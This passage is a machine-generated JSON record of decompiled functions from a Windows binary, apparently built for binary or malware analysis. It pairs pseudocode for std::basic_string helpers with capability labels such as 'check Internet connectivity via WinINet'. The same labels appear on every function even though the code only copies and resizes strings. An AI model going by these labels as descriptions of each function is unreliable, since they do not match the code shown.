        "decompiled_code": "\nvoid __thiscall fcn.004b0120(char **param_1, char *param_2, uint param_3)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *unaff_ESI;\n    \n    uVar1 = param_3;\n    if (param_2 < 0x10) {\n        pcVar2 = *param_1;\n        pcVar3 = param_2;\n    }\n    else {\n        pcVar3 = unaff_ESI;\n        pcVar2 = fcn.004b1e90(&param_2, 0);\n        *param_1 = pcVar2;\n        param_1[2] = pcVar3;\n        unaff_ESI = pcVar3;\n    }\n    if (pcVar3 != NULL) {\n        if (pcVar3 == 0x1) {\n            *pcVar2 = uVar1;\n            param_1[1] = unaff_ESI;\n            (*param_1)[unaff_ESI] = '\\0';\n            return;\n        }\n        sub.msvcrt.dll_memset(pcVar2, uVar1, pcVar3);\n        pcVar3 = unaff_ESI;\n        pcVar2 = *param_1;\n    }\n    param_1[1] = pcVar3;\n    pcVar2[pcVar3] = '\\0';\n    return;\n}\n",
        "token_count": 307
    },
    "004b02f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __thiscall fcn.004b02f0(int32_t *param_1, uchar *param_2, uchar *param_3)\n\n{\n    uchar *puVar1;\n    int32_t *extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar2;\n    int32_t iStack68;\n    uint32_t uStack60;\n    uchar *puStack56;\n    int32_t *piStack52;\n    uchar *puStack48;\n    uchar *puStack40;\n    int32_t iStack36;\n    int32_t iStack24;\n    \n    if ((param_2 == NULL) && (param_3 != NULL)) {\n        puStack48 = 0x4b03a8;\n        fcn.004be210(0x5246c8);\n        puStack48 = param_2;\n        puStack56 = param_3;\n        piStack52 = param_1;\n        if ((puStack40 == NULL) && (iStack36 != 0)) {\n            fcn.004be210(0x5246c8);\n            return extraout_ECX_00 + 8;\n        }\n        uVar2 = iStack36 - puStack40;\n        uStack60 = uVar2;\n        if (uVar2 < 0x10) {\n            puVar1 = *extraout_ECX;\n            if (uVar2 == 1) {\n                *puVar1 = *puStack40;\n                puVar1 = *extraout_ECX;\n                extraout_ECX[1] = 1;\n                puVar1[1] = 0;\n                return puVar1;\n            }\n            if (uVar2 == 0) {\n                extraout_ECX[1] = 0;\n                *puVar1 = 0;\n                return puVar1;\n            }\n        }\n        else {\n            puVar1 = fcn.004b1e90(&stack0xffffffc4, 0);\n            *extraout_ECX = puVar1;\n            extraout_ECX[2] = iStack68;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, puStack40, uVar2);\n        puVar1 = *extraout_ECX;\n        extraout_ECX[1] = iStack68;\n        puVar1[iStack68] = 0;\n        return puVar1;\n    }\n    if (param_3 - param_2 < 0x10) {\n        piStack52 = *param_1;\n        if (param_3 - param_2 == 1) {\n            *piStack52 = *param_2;\n            puVar1 = *param_1;\n            param_1[1] = 1;\n            puVar1[1] = 0;\n            return puVar1;\n        }\n        if (param_3 == param_2) {\n            param_1[1] = 0;\n            *piStack52 = 0;\n            return piStack52;\n        }\n    }\n    else {\n        puStack48 = 0x4b036a;\n        piStack52 = fcn.004b1e90();\n        *param_1 = piStack52;\n        param_1[2] = iStack24;\n    }\n    puStack48 = param_2;\n    puStack56 = 0x4b0386;\n    sub.msvcrt.dll_memcpy();\n    puVar1 = *param_1;\n    param_1[1] = iStack24;\n    puVar1[iStack24] = 0;\n    return puVar1;\n}\n",
        "token_count": 784
    },
    "004b03b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __thiscall fcn.004b03b0(int32_t *param_1, uchar *param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t iStack24;\n    uint32_t uStack16;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        fcn.004be210(0x5246c8);\n        return extraout_ECX + 8;\n    }\n    uVar2 = param_3 - param_2;\n    uStack16 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *param_1;\n        if (uVar2 == 1) {\n            *puVar1 = *param_2;\n            puVar1 = *param_1;\n            param_1[1] = 1;\n            puVar1[1] = 0;\n            return puVar1;\n        }\n        if (uVar2 == 0) {\n            param_1[1] = 0;\n            *puVar1 = 0;\n            return puVar1;\n        }\n    }\n    else {\n        puVar1 = fcn.004b1e90(&uStack16, 0);\n        *param_1 = puVar1;\n        param_1[2] = iStack24;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, param_2, uVar2);\n    puVar1 = *param_1;\n    param_1[1] = iStack24;\n    puVar1[iStack24] = 0;\n    return puVar1;\n}\n",
        "token_count": 380
    },
    "004b05e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004b05e0(int32_t *param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    char cStack48;\n    \n    iVar4 = param_1[1];\n    if (param_4 <= (param_3 + 0x7fffffff) - iVar4) {\n        piVar2 = *param_1;\n        uVar6 = (param_4 - param_3) + iVar4;\n        if (piVar2 == param_1 + 2) {\n            uVar5 = 0xf;\n        }\n        else {\n            uVar5 = param_1[2];\n        }\n        if (uVar5 < uVar6) {\n            cStack48 = param_4;\n            fcn.004b1f10(param_2, param_3, 0);\n            piVar2 = *param_1;\n        }\n        else {\n            iVar4 = iVar4 - (param_2 + param_3);\n            if ((iVar4 != 0) && (param_3 != param_4)) {\n                puVar3 = piVar2 + param_3 + param_2;\n                puVar1 = piVar2 + param_4 + param_2;\n                if (iVar4 == 1) {\n                    *puVar1 = *puVar3;\n                    piVar2 = *param_1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1, puVar3, iVar4);\n                    piVar2 = *param_1;\n                }\n            }\n        }\n        if (param_4 != 0) {\n            if (param_4 == 1) {\n                *(piVar2 + unaff_ESI) = cStack48;\n                piVar2 = *param_1;\n            }\n            else {\n                sub.msvcrt.dll_memset(piVar2 + unaff_ESI, cStack48, param_4);\n                piVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar6;\n        *(piVar2 + uVar6) = 0;\n        return param_1;\n    }\n    fcn.004be310(0x524614);\n    return extraout_ECX;\n}\n",
        "token_count": 566
    },
    "004b1bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b1bc0(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    \n    uVar2 = param_1[1];\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    puVar3 = *param_1;\n    piVar1 = param_1 + 2;\n    if (piVar1 == puVar3) {\n        uVar6 = 0xf;\n    }\n    else {\n        uVar6 = param_1[2];\n    }\n    if (uVar6 != param_2) {\n        if ((0xf < param_2) || (uVar6 < param_2)) {\n            puVar4 = fcn.004b1e90(&param_2, uVar6);\n            puVar3 = *param_1;\n            iVar5 = param_1[1] + 1;\n            if (iVar5 == 1) {\n                *puVar4 = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar5);\n            }\n            if (puVar3 != piVar1) {\n                fcn.004c2c30(puVar3);\n            }\n            *param_1 = puVar4;\n            param_1[2] = unaff_EBP;\n            return;\n        }\n        if (piVar1 != puVar3) {\n            iVar5 = uVar2 + 1;\n            if (iVar5 == 1) {\n                *(param_1 + 2) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(piVar1, puVar3, iVar5);\n            }\n            fcn.004c2c30(puVar3);\n            *param_1 = piVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "004b1cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b1cc0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = param_1[1];\n    iVar2 = *param_1;\n    iVar4 = iVar1 - (param_2 + param_3);\n    if ((iVar4 != 0) && (param_3 != 0)) {\n        puVar3 = param_2 + param_3 + iVar2;\n        if (iVar4 == 1) {\n            *(iVar2 + param_2) = *puVar3;\n            iVar2 = *param_1;\n            iVar1 = param_1[1];\n        }\n        else {\n            sub.msvcrt.dll_memmove(iVar2 + param_2, puVar3, iVar4);\n            iVar2 = *param_1;\n            iVar1 = param_1[1];\n        }\n    }\n    param_1[1] = iVar1 - param_3;\n    *(iVar2 + (iVar1 - param_3)) = 0;\n    return;\n}\n",
        "token_count": 266
    },
    "004b1d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004b1d40(int32_t *param_1, uchar *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    iVar2 = param_1[1];\n    piVar3 = *param_1;\n    uVar1 = iVar2 + param_3;\n    if (piVar3 == param_1 + 2) {\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = param_1[2];\n    }\n    if (uVar4 < uVar1) {\n        fcn.004b1f10(iVar2, 0, param_2, param_3);\n        piVar3 = *param_1;\n    }\n    else if (param_3 != 0) {\n        if (param_3 == 1) {\n            *(piVar3 + iVar2) = *param_2;\n            piVar3 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar3 + iVar2, param_2, param_3);\n            piVar3 = *param_1;\n        }\n    }\n    param_1[1] = uVar1;\n    *(piVar3 + uVar1) = 0;\n    return param_1;\n}\n",
        "token_count": 315
    },
    "004b1de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b1de0(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uStack40;\n    uint32_t auStack32 [4];\n    \n    if (param_1 != param_2) {\n        puVar2 = *param_1;\n        uVar1 = param_2[1];\n        if (param_1 + 2 == puVar2) {\n            uVar3 = 0xf;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar1) {\n            auStack32[0] = uVar1;\n            puVar2 = fcn.004b1e90(auStack32, uVar3);\n            if (param_1 + 2 != *param_1) {\n                fcn.004c2c30(*param_1);\n            }\n            *param_1 = puVar2;\n            param_1[2] = uStack40;\n        }\n        if (uVar1 != 0) {\n            if (uVar1 == 1) {\n                *puVar2 = **param_2;\n                puVar2 = *param_1;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar2, *param_2, uVar1);\n                puVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar1;\n        *(puVar2 + uVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "004b1f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b1f10(int32_t **param_1, uchar *param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t *piStack40;\n    int32_t aiStack32 [4];\n    \n    aiStack32[0] = (param_5 - param_3) + param_1[1];\n    if (param_1 + 2 == *param_1) {\n        piVar2 = 0xf;\n    }\n    else {\n        piVar2 = param_1[2];\n    }\n    piVar2 = fcn.004b1e90(aiStack32, piVar2);\n    ppiVar1 = *param_1;\n    if (param_2 != NULL) {\n        if (param_2 == 0x1) {\n            *piVar2 = *ppiVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar2, ppiVar1, param_2);\n        }\n    }\n    if ((param_2 != NULL) && (param_3 != 0)) {\n        if (param_3 == 1) {\n            *(piVar2 + param_2) = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar2 + param_2, param_2, param_3);\n        }\n    }\n    if (iStack64 != 0) {\n        if (iStack64 == 1) {\n            (param_2 + param_3)[piVar2] = *(iStack60 + ppiVar1);\n        }\n        else {\n            sub.msvcrt.dll_memcpy(param_2 + param_3 + piVar2, iStack60 + ppiVar1, iStack64);\n        }\n    }\n    if (param_1 + 2 != ppiVar1) {\n        fcn.004c2c30(ppiVar1);\n    }\n    *param_1 = piVar2;\n    param_1[2] = piStack40;\n    return;\n}\n",
        "token_count": 486
    },
    "004b2b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __thiscall\nfcn.004b2b50(int32_t **param_1, int32_t param_2, uint32_t param_3, int32_t **param_4, uint32_t param_5)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t in_stack_ffffffc8;\n    int32_t in_stack_ffffffcc;\n    \n    piVar3 = param_1[1];\n    if ((param_3 + 0x3fffffff) - piVar3 < param_5) {\n        fcn.004be310(\"basic_string::_M_replace\");\n        return in_stack_ffffffc8 - in_stack_ffffffcc;\n    }\n    ppiVar4 = *param_1;\n    piVar8 = (param_5 - param_3) + piVar3;\n    if (ppiVar4 == param_1 + 2) {\n        piVar6 = 0x7;\n    }\n    else {\n        piVar6 = param_1[2];\n    }\n    if (piVar6 < piVar8) {\n        fcn.004b4da0(param_2, param_3, param_4, param_5);\n        goto code_r0x004b2c1e;\n    }\n    puVar1 = ppiVar4 + param_2 * 2;\n    iVar5 = piVar3 - (param_2 + param_3);\n    bVar9 = iVar5 != 0;\n    bVar10 = param_3 != param_5;\n    if ((param_4 < ppiVar4) || (ppiVar4 + piVar3 * 2 < param_4)) {\n        if (bVar10 && bVar9) {\n            if (iVar5 == 1) {\n                puVar1[param_5] = puVar1[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + param_5, puVar1 + param_3, iVar5 * 2);\n            }\n        }\n        if (param_5 == 0) goto code_r0x004b2c1e;\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memcpy(puVar1, param_4, param_5 * 2);\n            goto code_r0x004b2c1e;\n        }\n    }\n    else {\n        if ((param_5 == 0) || (param_3 < param_5)) {\ncode_r0x004b2d7e:\n            if (bVar10 && bVar9) goto code_r0x004b2c81;\n        }\n        else {\n            if (param_5 == 1) {\n                *puVar1 = *param_4;\n                goto code_r0x004b2d7e;\n            }\n            sub.msvcrt.dll_memmove(puVar1, param_4, param_5 * 2);\n            if (!bVar10 || !bVar9) goto code_r0x004b2c1e;\ncode_r0x004b2c81:\n            if (iVar5 == 1) {\n                puVar1[param_5] = puVar1[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + param_5, puVar1 + param_3, iVar5 * 2);\n            }\n        }\n        if (param_5 <= param_3) goto code_r0x004b2c1e;\n        iVar5 = param_5 * 2;\n        ppiVar4 = puVar1 + param_3;\n        if (ppiVar4 < param_4 + iVar5) {\n            if (param_4 < ppiVar4) {\n                iVar5 = ppiVar4 - param_4;\n                iVar7 = iVar5 >> 1;\n                if (iVar7 == 1) {\n                    *puVar1 = *param_4;\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memmove(puVar1, param_4, iVar5);\n                }\n                iVar7 = param_5 - iVar7;\n                if (iVar7 == 1) {\n                    *(puVar1 + iVar5) = puVar1[param_5];\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memcpy(puVar1 + iVar5, puVar1 + param_5, iVar7 * 2);\n                }\n            }\n            else {\n                puVar2 = param_4 + (param_5 - param_3) * 2;\n                if (param_5 == 1) {\n                    *puVar1 = *puVar2;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar1, puVar2, iVar5);\n                }\n            }\n            goto code_r0x004b2c1e;\n        }\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memmove(puVar1, param_4, iVar5);\n            goto code_r0x004b2c1e;\n        }\n    }\n    *puVar1 = *param_4;\ncode_r0x004b2c1e:\n    param_1[1] = piVar8;\n    *(*param_1 + piVar8 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 1239
    },
    "004b2ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b2ed0(int32_t *param_1, uint32_t param_2, uint param_3)\n\n{\n    uint uVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EBP;\n    \n    uVar1 = param_3;\n    if (param_2 < 8) {\n        puVar2 = *param_1;\n    }\n    else {\n        uVar4 = unaff_EBP;\n        puVar2 = fcn.004b4d20(&param_2, 0);\n        param_2 = uVar4;\n        *param_1 = puVar2;\n        param_1[2] = param_2;\n    }\n    if (param_2 != 0) {\n        puVar3 = puVar2;\n        uVar4 = param_2;\n        if (param_2 == 1) {\n            *puVar2 = uVar1;\n        }\n        else {\n            do {\n                *puVar3 = uVar1;\n                uVar4 = uVar4 - 1;\n                puVar3 = puVar3 + 1;\n            } while (uVar4 != 0);\n        }\n    }\n    param_1[1] = param_2;\n    puVar2[param_2] = 0;\n    return;\n}\n",
        "token_count": 306
    },
    "004b3070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004b3070(uint *param_1, ushort *param_2, int32_t param_3)\n\n{\n    ushort *puVar1;\n    uint *extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar2;\n    uint32_t uStack68;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uint *puStack52;\n    ushort *puStack48;\n    ushort *puStack40;\n    int32_t iStack36;\n    uint32_t uStack24;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        puStack48 = 0x4b3116;\n        fcn.004be210(\"basic_string::_M_construct null not valid\");\n        puStack48 = param_2;\n        iStack56 = param_3;\n        puStack52 = param_1;\n        if ((puStack40 == NULL) && (iStack36 != 0)) {\n            fcn.004be210(\"basic_string::_M_construct null not valid\");\n            return extraout_ECX_00 + 8;\n        }\n        uStack60 = iStack36 - puStack40 >> 1;\n        if (uStack60 < 8) {\n            puVar1 = *extraout_ECX;\n            if (uStack60 == 1) {\n                *puVar1 = *puStack40;\n                goto code_r0x004b3158;\n            }\n            if (uStack60 == 0) goto code_r0x004b3158;\n        }\n        else {\n            puVar1 = fcn.004b4d20(&stack0xffffffc4, 0);\n            *extraout_ECX = puVar1;\n            extraout_ECX[2] = uStack68;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, puStack40, iStack36 - puStack40);\n        puVar1 = *extraout_ECX;\n        uStack60 = uStack68;\ncode_r0x004b3158:\n        extraout_ECX[1] = uStack60;\n        puVar1[uStack60] = 0;\n        return puVar1;\n    }\n    uVar2 = param_3 - param_2 >> 1;\n    if (uVar2 < 8) {\n        puStack52 = *param_1;\n        if (uVar2 == 1) {\n            *puStack52 = *param_2;\n            goto code_r0x004b30a8;\n        }\n        if (uVar2 == 0) goto code_r0x004b30a8;\n    }\n    else {\n        puStack48 = 0x4b30e6;\n        puStack52 = fcn.004b4d20();\n        *param_1 = puStack52;\n        param_1[2] = uStack24;\n    }\n    puStack48 = param_2;\n    iStack56 = 0x4b3102;\n    sub.msvcrt.dll_memcpy();\n    puStack52 = *param_1;\n    uVar2 = uStack24;\ncode_r0x004b30a8:\n    param_1[1] = uVar2;\n    *(puStack52 + uVar2 * 2) = 0;\n    return puStack52;\n}\n",
        "token_count": 734
    },
    "004b3120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort * __thiscall fcn.004b3120(uint *param_1, ushort *param_2, int32_t param_3)\n\n{\n    ushort *puVar1;\n    int32_t extraout_ECX;\n    uint32_t uStack24;\n    uint32_t uStack16;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        fcn.004be210(\"basic_string::_M_construct null not valid\");\n        return extraout_ECX + 8;\n    }\n    uStack16 = param_3 - param_2 >> 1;\n    if (uStack16 < 8) {\n        puVar1 = *param_1;\n        if (uStack16 == 1) {\n            *puVar1 = *param_2;\n            goto code_r0x004b3158;\n        }\n        if (uStack16 == 0) goto code_r0x004b3158;\n    }\n    else {\n        puVar1 = fcn.004b4d20(&uStack16, 0);\n        *param_1 = puVar1;\n        param_1[2] = uStack24;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, param_2, param_3 - param_2);\n    puVar1 = *param_1;\n    uStack16 = uStack24;\ncode_r0x004b3158:\n    param_1[1] = uStack16;\n    puVar1[uStack16] = 0;\n    return puVar1;\n}\n",
        "token_count": 339
    },
    "004b3350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004b3350(int32_t *param_1, int32_t param_2, uint32_t param_3, uint32_t param_4, ushort param_5)\n\n{\n    ushort *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    ushort *puVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    ushort uStack48;\n    \n    iVar4 = param_1[1];\n    if (param_4 <= (param_3 + 0x3fffffff) - iVar4) {\n        piVar2 = *param_1;\n        uVar6 = (param_4 - param_3) + iVar4;\n        if (piVar2 == param_1 + 2) {\n            uVar3 = 7;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar6) {\n            uStack48 = param_4;\n            fcn.004b4da0(param_2, param_3, 0);\n            piVar2 = *param_1;\n        }\n        else {\n            iVar4 = iVar4 - (param_3 + param_2);\n            if ((iVar4 != 0) && (param_3 != param_4)) {\n                puVar5 = piVar2 + param_3 * 2 + param_2 * 2;\n                puVar1 = piVar2 + param_4 * 2 + param_2 * 2;\n                if (iVar4 == 1) {\n                    *puVar1 = *puVar5;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1, puVar5, iVar4 * 2);\n                    piVar2 = *param_1;\n                }\n            }\n        }\n        if (param_4 != 0) {\n            puVar5 = piVar2 + unaff_ESI * 2;\n            if (param_4 == 1) {\n                *puVar5 = uStack48;\n            }\n            else {\n                do {\n                    *puVar5 = param_5;\n                    puVar5 = puVar5 + 1;\n                    param_4 = param_4 - 1;\n                } while (param_4 != 0);\n            }\n        }\n        param_1[1] = uVar6;\n        *(piVar2 + uVar6 * 2) = 0;\n        return param_1;\n    }\n    fcn.004be310(\"basic_string::_M_replace_aux\");\n    return extraout_ECX;\n}\n",
        "token_count": 593
    },
    "004b4a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b4a30(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    \n    uVar2 = param_1[1];\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    puVar3 = *param_1;\n    piVar1 = param_1 + 2;\n    if (piVar1 == puVar3) {\n        uVar6 = 7;\n    }\n    else {\n        uVar6 = param_1[2];\n    }\n    if (uVar6 != param_2) {\n        if ((7 < param_2) || (uVar6 < param_2)) {\n            puVar4 = fcn.004b4d20(&param_2, uVar6);\n            puVar3 = *param_1;\n            iVar5 = param_1[1] + 1;\n            if (iVar5 == 1) {\n                *puVar4 = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar5 * 2);\n            }\n            if (piVar1 != puVar3) {\n                fcn.004c2c30(puVar3);\n            }\n            *param_1 = puVar4;\n            param_1[2] = unaff_EBP;\n            return;\n        }\n        if (piVar1 != puVar3) {\n            iVar5 = uVar2 + 1;\n            if (iVar5 == 1) {\n                *(param_1 + 2) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(piVar1, puVar3, iVar5 * 2);\n            }\n            fcn.004c2c30(puVar3);\n            *param_1 = piVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 487
    },
    "004b4bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004b4bc0(int32_t *param_1, ushort *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    \n    iVar3 = param_1[1];\n    piVar4 = *param_1;\n    uVar1 = iVar3 + param_3;\n    if (piVar4 == param_1 + 2) {\n        uVar5 = 7;\n    }\n    else {\n        uVar5 = param_1[2];\n    }\n    if (uVar5 < uVar1) {\n        fcn.004b4da0(iVar3, 0, param_2, param_3);\n        piVar4 = *param_1;\n    }\n    else if (param_3 != 0) {\n        puVar2 = piVar4 + iVar3 * 2;\n        if (param_3 == 1) {\n            *puVar2 = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, param_2, param_3 * 2);\n            piVar4 = *param_1;\n        }\n    }\n    param_1[1] = uVar1;\n    *(piVar4 + uVar1 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 326
    },
    "004b4c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b4c60(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uStack40;\n    uint32_t auStack32 [4];\n    \n    if (param_1 != param_2) {\n        puVar2 = *param_1;\n        uVar1 = param_2[1];\n        if (param_1 + 2 == puVar2) {\n            uVar3 = 7;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar1) {\n            auStack32[0] = uVar1;\n            puVar2 = fcn.004b4d20(auStack32, uVar3);\n            if (param_1 + 2 != *param_1) {\n                fcn.004c2c30(*param_1);\n            }\n            *param_1 = puVar2;\n            param_1[2] = uStack40;\n        }\n        if (uVar1 != 0) {\n            if (uVar1 == 1) {\n                *puVar2 = **param_2;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar2, *param_2, uVar1 * 2);\n                puVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar1;\n        *(puVar2 + uVar1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "004b4da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
